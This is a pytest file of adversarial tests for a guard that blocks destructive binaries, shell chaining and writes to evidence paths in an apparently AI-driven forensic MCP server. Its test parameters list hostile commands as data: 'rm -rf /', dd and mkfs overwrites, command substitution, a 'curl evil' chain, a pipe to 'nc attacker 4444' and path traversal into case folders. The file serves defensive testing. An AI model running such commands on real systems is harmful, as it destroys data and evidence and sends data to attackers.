"""Adversarial guardrail tests — does the architectural command/path guard hold up when
someone actively tries to BYPASS it?

The primary control is architectural: every tool hard-codes its own forensic binary as
argv[0] and passes an argv list (never a shell), so the model can neither choose the
binary nor smuggle a second command. `guard_command` / `guard_output_path` are the
defense-in-depth layer. These tests attack that layer directly, and pin the ONE
documented, deliberate limitation so it can never become a silent surprise.
"""
import pytest
from mcp_server.audit import guard_command, guard_output_path


# ── Destructive binaries must be blocked however they are spelled ────────────────
@pytest.mark.parametrize("argv", [
    ["/usr/bin/rm", "-rf", "/cases"],          # absolute path prefix
    ["RM.EXE", "x"],                            # windows-style + uppercase
    ["../../bin/shred", "evidence"],            # relative path traversal in argv[0]
    ["dd", "if=/dev/zero", "of=/cases/x.E01"],  # evidence overwrite
    ["mkfs.ext4", "/dev/sda"],                  # basename starts with mkfs
])
def test_destructive_binaries_blocked_any_spelling(argv):
    with pytest.raises(PermissionError):
        guard_command(argv)


# ── Shell smuggling / chaining tokens blocked in ANY argument position ───────────
@pytest.mark.parametrize("argv", [
    ["vol", "-f", "img", ";", "rm -rf /"],          # standalone token
    ["vol", "-f", "img;rm -rf /"],                   # token embedded in an arg
    ["vol", "-f", "img", "&&", "curl evil"],         # chaining
    ["vol", "-f", "img", "|", "nc attacker 4444"],   # pipe to exfil
    ["vol", "-f", "$(rm -rf /)"],                     # command substitution
    ["vol", "-f", "`rm -rf /`"],                      # backtick substitution
    ["EvtxECmd.dll", "-d", "x", ">", "/cases/out"],  # redirection to evidence
])
def test_shell_smuggling_blocked(argv):
    with pytest.raises(PermissionError):
        guard_command(argv)


def test_shell_string_form_rejected():
    # A whole command as a string (the only way to get a real shell) is refused outright.
    with pytest.raises(PermissionError):
        guard_command("vol -f img && rm -rf /")


# ── Evidence is write-protected, including via traversal ─────────────────────────
@pytest.mark.parametrize("path", [
    "/cases/ROCBA/out.csv",
    "/mnt/evidence/x",
    "/media/usb/y",
    "/tmp/../cases/ROCBA/sneaky.csv",            # absolute traversal that RESOLVES into /cases
    "/mnt/evidence/../../cases/x",               # traversal out of /mnt back into /cases
])
def test_evidence_paths_write_blocked(path):
    with pytest.raises(PermissionError):
        guard_output_path(path)


def test_legitimate_output_paths_allowed():
    # Working dirs the tools actually write to must still pass.
    for ok in ("./exports/x.csv", "./analysis/findings.json", "./reports/r.html"):
        guard_output_path(ok)


# ── Legit forensic launches must NOT be blocked (no false positives) ─────────────
def test_real_forensic_commands_allowed():
    # NB: Volatility is launched as `python3 -m volatility3`, so the interpreter CANNOT
    # be denylisted without breaking the product — see the documented-limitation test.
    guard_command(["python3", "-m", "volatility3", "-f", "/cases/mem.raw", "windows.pslist"])
    guard_command(["dotnet", "/opt/zimmermantools/EvtxeCmd/EvtxECmd.dll", "-d", "/mnt/x", "--csv", "./exports"])
    guard_command(["fls", "-r", "-o", "2048", "/cases/disk.E01"])
    guard_command(["yara", "rules.yar", "/cases/file.bin"])


# ── The ONE deliberate, documented limitation, pinned so it can't drift ──────────
def test_documented_limitation_interpreters_pass_guard_by_design():
    """guard_command does NOT denylist language interpreters (python3/perl/node/ruby),
    because Volatility itself runs as `python3 -m volatility3`; denylisting them would
    break the product. This is acceptable ONLY because of the architectural primary
    control: the model never supplies argv[0] — every registered MCP tool hard-codes its
    own binary, so an interpreter can never be invoked with attacker-chosen arguments.
    This test documents (does not 'fix') that boundary so a future reader sees it was a
    conscious decision and a reviewer can probe exactly here.
    """
    guard_command(["python3", "-c", "print('volatility uses this argv[0]')"])  # passes guard by design
    # ...but the moment a shell metacharacter rides along, the token check still catches it:
    with pytest.raises(PermissionError):
        guard_command(["python3", "-c", "import os; os.system('rm -rf /')", ";", "rm -rf /"])
